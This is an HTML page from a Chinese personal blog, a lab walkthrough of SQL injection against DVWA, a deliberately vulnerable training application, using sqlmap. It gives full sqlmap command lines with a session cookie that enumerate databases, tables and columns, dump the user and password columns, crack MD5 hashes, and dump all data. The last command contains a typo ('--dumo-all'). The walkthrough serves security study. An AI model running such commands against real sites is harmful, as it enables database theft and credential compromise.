@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>DVWA--sql注入（sqlmap工具使用） | 沫的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="DVWA low级注入 工具注入 sqlmap注入点：http:&#x2F;&#x2F;119.29.172.123:888&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;4&amp;Submit&#x3D;Submit渗透过程中因为靶机需要进行登陆，所以需要cookie 渗透攻击环境windows–sqlmap注意事项1.sqlmap必须运行在python2环境上2.sqlmap地址传入的时候需要加入双引号，不能使用单引">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA--sql注入（sqlmap工具使用）">
+<meta property="og:url" content="http://yoursite.com/2020/02/09/DVWA-sql%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%89/index.html">
+<meta property="og:site_name" content="沫的博客">
+<meta property="og:description" content="DVWA low级注入 工具注入 sqlmap注入点：http:&#x2F;&#x2F;119.29.172.123:888&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;4&amp;Submit&#x3D;Submit渗透过程中因为靶机需要进行登陆，所以需要cookie 渗透攻击环境windows–sqlmap注意事项1.sqlmap必须运行在python2环境上2.sqlmap地址传入的时候需要加入双引号，不能使用单引">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/images/pasted-11.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-12.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-13.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-14.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-15.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-16.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-17.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-18.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-19.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-20.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-21.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-22.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-23.png">
+<meta property="article:published_time" content="2020-02-09T11:17:47.000Z">
+<meta property="article:modified_time" content="2020-02-09T12:12:49.905Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-11.png">
+  
+    <link rel="alternate" href="/atom.xml" title="沫的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">沫的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-DVWA-sql注入（sqlmap工具使用）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/09/DVWA-sql%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%89/" class="article-date">
+  <time datetime="2020-02-09T11:17:47.000Z" itemprop="datePublished">2020-02-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DVWA--sql注入（sqlmap工具使用）
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="DVWA-low级注入-工具注入-sqlmap"><a href="#DVWA-low级注入-工具注入-sqlmap" class="headerlink" title="DVWA low级注入 工具注入 sqlmap"></a>DVWA low级注入 工具注入 sqlmap</h3><p>注入点：<a href="http://119.29.172.123:888/vulnerabilities/sqli/?id=4&amp;Submit=Submit" target="_blank" rel="noopener">http://119.29.172.123:888/vulnerabilities/sqli/?id=4&amp;Submit=Submit</a><br>渗透过程中因为靶机需要进行登陆，所以需要cookie</p>
+<h6 id="渗透攻击环境windows–sqlmap注意事项"><a href="#渗透攻击环境windows–sqlmap注意事项" class="headerlink" title="渗透攻击环境windows–sqlmap注意事项"></a>渗透攻击环境windows–sqlmap注意事项</h6><p>1.sqlmap必须运行在python2环境上<br>2.sqlmap地址传入的时候需要加入双引号，不能使用单引号，不然会报错</p>
+<h6 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h6><p>例：pyload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; -v 7</span><br></pre></td></tr></table></figure>
+
+<p><span style="color:blue;"> 填充参数发起攻击 </span></p>
+<pre><code>-u &quot;注入的地址&quot;
+-p 指定注入点
+-v 显示执行回显，最高回显为7
+--cookie 传入登陆信息</code></pre><p><img src="/images/pasted-11.png" alt="upload successful"></p>
+<p>他会问你是否注入id，因为我已经手注过，所以知道注入点是id，就只注入id，如果不选择y，那么就会全部注入 第二个是问你他看起来像是mysql后端，选择yes是就行了</p>
+<p><img src="/images/pasted-12.png" alt="upload successful"></p>
+<p>注入后得到这个参数是脆弱的，是否测试其余参数，默认是不测试</p>
+<p><img src="/images/pasted-13.png" alt="upload successful"></p>
+<p>注入后的返回结果，sqlmap默认执行了4种注入方法</p>
+<p><span style="color:red;"> 1.布尔注入</span></p>
+<p>布尔注入，返回true和false,也可以称为逻辑注入<br><img src="/images/pasted-14.png" alt="upload successful"></p>
+<p><span style="color:red;"> 2.报错注入</span></p>
+<p>执行sql语句时候，会进行报错</p>
+<p><img src="/images/pasted-15.png" alt="upload successful"></p>
+<p><span style="color:red;"> 3.时间注入 time</span></p>
+<p>有部分的mysql执行他是没有数据返回的，如果需要判断一个sql注入可以用他内置函数延时来判断他是否存在sql注入</p>
+<p><img src="/images/pasted-16.png" alt="upload successful"></p>
+<p><span style="color:red;"> 4.联合查询</span></p>
+<p>这种注入方式比较主流，可以配合order去猜表各种。<br><img src="/images/pasted-17.png" alt="upload successful"></p>
+<h6 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h6><p>例：pyload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; -v 3 --current-db</span><br></pre></td></tr></table></figure>
+
+<p><span style="color:blue;">可以看到获取到的表是dvwa</span></p>
+<p><img src="/images/pasted-18.png" alt="upload successful"></p>
+<h6 id="获取数据库中的所有表"><a href="#获取数据库中的所有表" class="headerlink" title="获取数据库中的所有表"></a>获取数据库中的所有表</h6><p>例：pyload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; -v 3 --tables -D &quot;dvwa&quot;</span><br></pre></td></tr></table></figure>
+<p><span style="color:blue;">–tables 获取表-D （D代表当前数据库database）</span></p>
+<p><img src="/images/pasted-19.png" alt="upload successful"></p>
+<h6 id="拆解表的字段"><a href="#拆解表的字段" class="headerlink" title="拆解表的字段"></a>拆解表的字段</h6><p>例：pyload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; -v 3 --columns -T &quot;users&quot; -D &quot;dvwa&quot;</span><br></pre></td></tr></table></figure>
+
+<p><span style="color:blue;">–columns （拆解字段）-T (T代表的是tables) users是需要拆解的表名</span></p>
+<p><img src="/images/pasted-20.png" alt="upload successful"></p>
+<h6 id="获取字段里的数据"><a href="#获取字段里的数据" class="headerlink" title="获取字段里的数据"></a>获取字段里的数据</h6><p>例：pyload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; --dump  -C&quot;user,password&quot; -T &quot;users&quot; -D &quot;dvwa&quot;</span><br></pre></td></tr></table></figure>
+<p><span style="color:blue;">–dump 把信息存储下来  -C (代表需要获取数据的字段)</span></p>
+<p><img src="/images/pasted-21.png" alt="upload successful"></p>
+<p><span style="color:blue;">sqlmap自带md5字典破解（选择默认值，就可以自动进行破解</span></p>
+<p><img src="/images/pasted-22.png" alt="upload successful"></p>
+<h6 id="获取其他数据库"><a href="#获取其他数据库" class="headerlink" title="获取其他数据库"></a>获取其他数据库</h6><p>例：pyload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; --dbs</span><br></pre></td></tr></table></figure>
+<p><span style="color:blue;">下图就是获取的数据库,剩余获取数据，拆表字段和上面一样</span><br><img src="/images/pasted-23.png" alt="upload successful"></p>
+<h6 id="root权限脱裤"><a href="#root权限脱裤" class="headerlink" title="root权限脱裤"></a>root权限脱裤</h6><p>例：pyload<br><span style="color:blue;">嘿嘿执行这个命令你就可以看见黑客超炫酷的画面了哦</span></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; --dumo-all</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/09/DVWA-sql%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%89/" data-id="ck6ezo0600000vx5e5wb87a69" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/02/08/sql_injection/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">DVWA-sql注入手注（low）</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/02/09/DVWA-sql%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%89/">DVWA--sql注入（sqlmap工具使用）</a>
+          </li>
+        
+          <li>
+            <a href="/2020/02/08/sql_injection/">DVWA-sql注入手注（low）</a>
+          </li>
+        
+          <li>
+            <a href="/2020/02/06/python_F_Q/">python-Django的Q对象和F对象</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
